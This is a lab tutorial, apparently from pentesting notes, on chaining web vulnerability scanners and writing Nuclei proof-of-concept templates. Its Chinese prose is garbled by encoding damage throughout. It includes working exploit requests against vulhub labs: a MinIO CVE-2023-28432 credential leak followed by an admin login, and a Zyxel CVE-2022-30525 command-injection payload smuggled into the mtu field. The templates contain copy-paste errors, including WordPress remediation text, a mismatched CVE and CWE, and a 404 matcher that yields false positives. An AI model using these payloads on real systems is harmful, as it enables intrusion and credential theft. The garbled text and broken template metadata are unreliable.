# æ¼æ‰«å·¥å…·

## ç»¼åˆç±»

æ‰€è°“ç»¼åˆç±»ï¼Œå°±æ˜¯æ— ç‰¹å¾æ˜æ˜¾çš„ç½‘ç«™ï¼ˆæ²¡æœ‰æ˜æ˜¾å¯¹åº”æ¼æ´ç»„ä»¶ï¼Œå¦‚ shiroã€thinkphpç­‰ï¼‰ï¼Œä¹Ÿæ¯”å¦‚æ²¡æœ‰ç”¨åˆ°å…¬å¼€cmsè€Œæ˜¯è‡ªå·±å¼€å‘çš„ç½‘ç«™

è¿™æ—¶å€™ç”¨åˆ° awvsã€xray ä¼šæ›´é€‚åˆ

### awvs

<img src=".\å›¾ç‰‡\Snipaste_2023-10-27_16-27-17.png" alt="Snipaste_2023-10-27_16-27-17" style="zoom:80%;" />

### xray

```bash
xray.exe webscan --basic-crawler http://testphp.vulnweb.com/ --html-output vulnweb.html
```

<img src=".\å›¾ç‰‡\Snipaste_2023-10-27_16-18-15.png" alt="Snipaste_2023-10-27_16-18-15" style="zoom:80%;" />

### Goby

https://gobysec.net/

æˆ‘çš„åœ¨ win10 è™šæ‹Ÿæœºé‡Œé¢

## Burp&Xrayè”åŠ¨

burp æŠ“åŒ…ç»™ xray æ‰«

æœ‰æ—¶å€™ç›®æ ‡ä¸º app æ—¶ï¼Œå¦‚æœç›´æ¥ç”¨æµè§ˆå™¨æ‰“å¼€æ—¶å¾ˆå¯èƒ½ä¼šæ‰“ä¸å¼€ç½‘ç«™ã€‚ä½†æ˜¯ç”¨ burp å¯ä»¥æŠ“åˆ° app çš„åŒ…è€Œå‘ç»™ xrayï¼Œå¸¸è§„çŠ¶æ€ä¹Ÿå¯ä»¥ è¾¹ burp æŠ“åŒ… è¾¹æ‰«æ 



xray ç›‘å¬ï¼š

```bash
xray.exe webscan --listen 127.0.0.1:7777 --html-output burp_xray.html
```

burp è®¾ç½®ä¸‹å±‚ä»£ç†ï¼š

<img src=".\å›¾ç‰‡\Snipaste_2023-10-27_16-42-44.png" alt="Snipaste_2023-10-27_16-42-44" style="zoom:67%;" />

burp æµè§ˆå™¨è®¿é—® ç›®æ ‡ç½‘ç«™ `http://testphp.vulnweb.com/` æ—¶ï¼Œxray ä¾¿å¯ç›‘å¬åˆ°æ•°æ®åŒ…ç„¶åæ¼æ‰«

<img src=".\å›¾ç‰‡\Snipaste_2023-10-27_16-49-31.png" alt="Snipaste_2023-10-27_16-49-31" style="zoom:67%;" />

## Awvs&xrayè”åŠ¨

Awvsï¼šçˆ¬è™«å¼ºï¼ŒPocå›½å†…å·®ç‚¹

Xrayï¼šçˆ¬è™«å¼±ï¼ŒPocå›½å†…å‹å¥½

æ­é…èµ·æ¥æ—¶æ˜¯ Awvs çš„ä¼˜åŠ¿çˆ¬è™« é…ä¸Š Xray çš„ä¼˜åŠ¿å›½å†…Pocï¼Œå¼ºå¼ºè”æ‰‹

Awvs --> Xray



xray ç›‘å¬ï¼š

```
xray.exe webscan --listen 127.0.0.1:6666 --html-output awvs_xray.html
```

Awvsé…ç½®ä¸‹å±‚ä»£ç†ï¼š

<img src=".\å›¾ç‰‡\Snipaste_2023-10-27_17-02-29.png" alt="Snipaste_2023-10-27_17-02-29" style="zoom:67%;" />

äºæ˜¯ awvs ä¹Ÿåœ¨æ‰«ï¼ŒæŠŠæ‰«åˆ°çš„ æ•°æ®åŒ… å†å‘ç»™ xray æ‰«ï¼š

<img src=".\å›¾ç‰‡\Snipaste_2023-10-27_17-02-59.png" alt="Snipaste_2023-10-27_17-02-59" style="zoom:80%;" />

## Awvs&Burp&Xrayè”åŠ¨

```
1ã€ä¸»-Awvsè®¾ç½®ä»£ç†æ‰«æ-awvså…±äº«èµ„æºæ‰«ä¸€æ¬¡  è®¾ç½®ä»£ç† 8080
2ã€ä¸­-Burpè®¾ç½®è½¬å‘ä»£ç†-burpå…±äº«èµ„æºæ‰«ä¸€æ¬¡  burp æœ¬èº«ç›‘å¬ 8080ï¼Œç„¶åè®¾ç½®ä¸‹å±‚ä»£ç† 6666
3ã€å‰¯-Xrayè®¾ç½®è¢«åŠ¨æ‰«æ-Xrayæœ€åçš„ä¸€æ¬¡æ‰«æ  ç›‘å¬ 6666
```

```bash
xray.exe webscan --listen 127.0.0.1:6666 --html-output awvs_burp_xray.html
```



awvs æœ‰æ•°æ®

burpæœ‰æ•°æ®ï¼ˆè¿™é‡Œä¹Ÿå¯è‡ªåŠ¨é…åˆ burp çš„å„ç§å„æ ·çš„æ’ä»¶ä¸€èµ·æ‰«æï¼‰

<img src=".\å›¾ç‰‡\Snipaste_2023-10-27_17-17-40.png" alt="Snipaste_2023-10-27_17-17-40" style="zoom:67%;" />

xrayæœ‰æ•°æ®

<img src=".\å›¾ç‰‡\Snipaste_2023-10-27_17-17-54.png" alt="Snipaste_2023-10-27_17-17-54" style="zoom:67%;" />

## Nuclei-è¾ƒç»¼åˆç±»

```
Nuclei-Templates&ä¸‰æ–¹Nuclei-Templatesï¼š
https://github.com/projectdiscovery/nuclei-templates
https://github.com/ExpLangcn/NucleiTP
æ‰«ææ‰¹é‡url
nucle -l urls.txt
æ‰«æå•ä¸ªç›®æ ‡
nuclei -target xxx.com
åŠ è½½å¯¹åº”çš„pocè„šæœ¬ï¼Œå¯ä»¥æ˜¯å½“å‰è·¯å¾„ä¸‹
nuclei -t ./test/
nuclei -t ./test/test.yaml
æ¨èä½¿ç”¨ï¼Œæ‰¹é‡æ£€æµ‹urls.txtï¼Œpocä¸ºtest.yamlï¼Œè¾“å‡ºç»“æœresult.txt
nuclei -l urls.txt -t test.yaml -o result.txt
```

kaliå¼€å¯ä¸€ä¸ªshiro

```bash
â””â”€# docker run -it -p 8888:8080 vulhub/shiro:1.2.4
```

æ‰«æ

```bash
nuclei.exe -target http://192.168.10.5:8888/
```

<img src=".\å›¾ç‰‡\Snipaste_2023-10-27_19-30-42.png" alt="Snipaste_2023-10-27_19-30-42" style="zoom:80%;" />

## Afrog-ç‰¹å¾ç±»

```
æ‰«æå•ä¸ªç›®æ ‡
afrog -t http://example.com -o result.html
æ‰«æå¤šä¸ªç›®æ ‡
afrog -T urls.txt -o result.html
æµ‹è¯•å•ä¸ªPoC
afrog -t http://example.com -P ./testing/poc-test.yaml -o result.html
æµ‹è¯•å¤šä¸ªPoC
afrog -t http://example.com -P ./testing/ -o result.html
```

## Yakitå¯ç‰¹å¾å¯ç»¼åˆ

kaliå¼€å¯ä¸€ä¸ªshiro

```bash
â””â”€# docker run -it -p 8888:8080 vulhub/shiro:1.2.4
```

æ‰«æ

<img src=".\å›¾ç‰‡\Snipaste_2023-10-27_19-33-01.png" alt="Snipaste_2023-10-27_19-33-01" style="zoom:80%;" />

# Nuclei POC

å¼€å‘ç¯å¢ƒï¼šVscode+Yamlæ’ä»¶

https://code.visualstudio.com/

ä½¿ç”¨ yaml è¯­æ³•ï¼Œå¼€å‘æ–‡æ¡£ï¼š

https://docs.nuclei.sh/template-guide/introduction

https://blog.csdn.net/qq_41315957/article/details/126594572

https://blog.csdn.net/qq_41315957/article/details/126594670

nuclei burp è‡ªåŠ¨ç¼–å†™æ’ä»¶ https://github.com/projectdiscovery/nuclei-burp-plugin

```
#Nuclei-Pocå¼€å‘-Yamlè¯­æ³•&åŒ¹é…æå–
YAMLæ˜¯ä¸€ç§æ•°æ®åºåˆ—åŒ–è¯­è¨€ï¼Œå®ƒçš„åŸºæœ¬è¯­æ³•è§„åˆ™æ³¨æ„å¦‚ä¸‹ï¼š
-å¤§å°å†™æ•æ„Ÿ
-ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»
-ç¼©è¿›æ—¶ä¸å…è®¸ä½¿ç”¨Tabé”®ï¼Œåªå…è®¸ä½¿ç”¨ç©ºæ ¼ã€‚
-ç¼©è¿›çš„ç©ºæ ¼æ•°ç›®ä¸é‡è¦ï¼Œåªè¦ç›¸åŒå±‚çº§çš„å…ƒç´ å·¦ä¾§å¯¹é½å³å¯

Yaml Pocæ¨¡ç‰ˆï¼š
1ã€ç¼–å· id
2ã€ä¿¡æ¯ info
3ã€è¯·æ±‚ http file tcpç­‰
4ã€åŒ¹é… matchers Interactsh
5ã€æå– extractors

å¼€å‘æµç¨‹ï¼š
0ã€pocæ¨¡ç‰ˆå¥—ç”¨ä¿®æ”¹
1ã€pocåˆ›å»ºç‹¬ç«‹ç¼–å·
2ã€pocå¡«å…¥è¯¦ç»†ä¿¡æ¯
3ã€pocæäº¤åè®®æµç¨‹ç¼–å†™
4ã€pocç»“æœåŒ¹é…æ¨¡å¼åˆ¤æ–­
5ã€pocç»“æœæå–æ¨¡å¼åˆ¤æ–­
```

yaml ç¼–å†™ pocï¼Œå…¶å®æ–¹æ³•ä¸ python æˆ–è€…å…¶å®ƒè¯­è¨€ ç¼–å†™ poc ç±»ä¼¼ï¼Œéƒ½æ˜¯éœ€è¦ æ„é€ ç‰¹æ®Šè¯·æ±‚ï¼Œç„¶ååˆ¤æ–­ç‰¹æ®Šå›æ˜¾ï¼Œyaml è¯­æ³• çš„æ‹“å±•æ€§æå¼ºï¼Œå¯ä»¥å®Œç¾åµŒåˆåˆ° Nuclei é‡Œ

## ä¾‹å­1 

https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md

å¼€å¯ vulhub ç¯å¢ƒ ï¼Œå…³é—­ç¯å¢ƒä¸º `docker-compose down`

```
â”€â”€(rootğŸ’€kali)-[~/Desktop/vulhub/minio/CVE-2023-28432]
â””â”€# docker-compose up -d  
```

æ‰‹åŠ¨å¤ç°ï¼Œè¯·æ±‚ï¼š

```http
POST /minio/bootstrap/v1/verify HTTP/1.1
Host: 192.168.10.5:9000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
```

è¿”å›ï¼š

```http
HTTP/1.1 200 OK
Content-Security-Policy: block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
X-Amz-Request-Id: 179226E16C20DBD7
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Date: Sat, 28 Oct 2023 03:12:39 GMT
Content-Length: 1107
Content-Type: text/plain; charset=utf-8
Connection: close

{"MinioEndpoints":[{"Legacy":true,"SetCount":1,"DrivesPerSet":3,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"node1:9000","Path":"/mnt/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"node2:9000","Path":"/mnt/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"node3:9000","Path":"/mnt/data3","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false}],"CmdLine":"http://node1:9000/mnt/data1 http://node2:9000/mnt/data2 http://node3:9000/mnt/data3","Platform":"OS: linux | Arch: amd64"}],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_ROOT_PASSWORD":"minioadmin-vulhub","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"minioadmin","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key"}}
```

å¯è§ï¼Œå…¶ä¸­åŒ…å«`MINIO_SECRET_KEY`å’Œ`MINIO_ROOT_PASSWORD`ã€‚ä½¿ç”¨è¿™ä¸ªè´¦å·å¯†ç ï¼Œå³å¯æˆåŠŸç™»å½•ç®¡ç†åå°ï¼š

```
minioadmin:minioadmin-vulhub
```

ç™»å½•ï¼š

```http
POST /api/v1/login HTTP/1.1
Host: 192.168.10.5:9001
Content-Length: 58
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.10.5:9001
Referer: http://192.168.10.5:9001/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"accessKey":"minioadmin","secretKey":"minioadmin-vulhub"
```



æŸ¥çœ‹å¯¹åº” minio_cve_2023_28432.yamlï¼š

```yaml
id: CVE-2023-28432

info:
  name: MinIOé›†ç¾¤æ¨¡å¼ä¿¡æ¯æ³„éœ²æ¼æ´
  author: xiaodisec
  severity: high
  description: |
    MinIOé›†ç¾¤æ¨¡å¼ä¿¡æ¯æ³„éœ²æ¼æ´
  remediation: |
    Update to WordPress Accessibility Helper version 0.6.0.7 or later to mitigate this vulnerability.
  reference:
    - https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md
  tags: cve,mimio,cve2023

http:
  - raw:
      - |
        POST /minio/bootstrap/v1/verify HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en-US;q=0.9,en;q=0.8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
        Connection: close
        Cache-Control: max-age=0
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0

        

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - 'MINIO_SECRET_KEY'
          - 'MINIO_ROOT_PASSWORD'
        
      - type: status
        status:
          - 404
```



nuclei poc æ£€æµ‹ï¼š

```
nuclei.exe -t minio_cve_2023_28432.yaml -target http://192.168.10.5:9000
```

<img src=".\å›¾ç‰‡\Snipaste_2023-10-28_11-22-09.png" alt="Snipaste_2023-10-28_11-22-09" style="zoom:80%;" />

## ä¾‹å­2

https://blog.csdn.net/weixin_43080961/article/details/124776553

CVE-2022-30525ï¼ˆäº¤äº’ç¼–å†™ï¼‰

pocï¼š

```http
POST /ztp/cgi-bin/handler HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/json
Connection: close
Content-Length: 165
 
{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; ping {DNSlog};","data":"hi"}
```



zyxel_CVE_2022_30525.yamlï¼š

```yaml
id: CVE-2022-30525

info:
  name: Zyxel é˜²ç«å¢™æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ³¨å…¥
  author: xiaodisec
  severity: high
  description: |
    Zyxel é˜²ç«å¢™æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ³¨å…¥
  remediation: |
    Zyxel é˜²ç«å¢™æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ³¨å…¥
  reference:
    - https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-0150
    cwe-id: CWE-79
    epss-score: 0.00133
    epss-percentile: 0.47722
    cpe: cpe:2.3:a:wp_accessibility_helper_project:wp_accessibility_helper:*:*:*:*:*:wordpress:*:*
  tags: cve,Zyxel,cve2022

http:
  - raw:
      - |
        POST /ztp/cgi-bin/handler HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"{{xd}}","data":"hi"}

    payloads:
      xd:
        - ";ping -c 3 {{interactsh-url}};"
    
    matchers:
      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"
```

è¿™é‡Œçš„ {{interactsh-url}} å…¶å®ç›¸å½“äºnuclei å†…ç½®çš„ dnslog


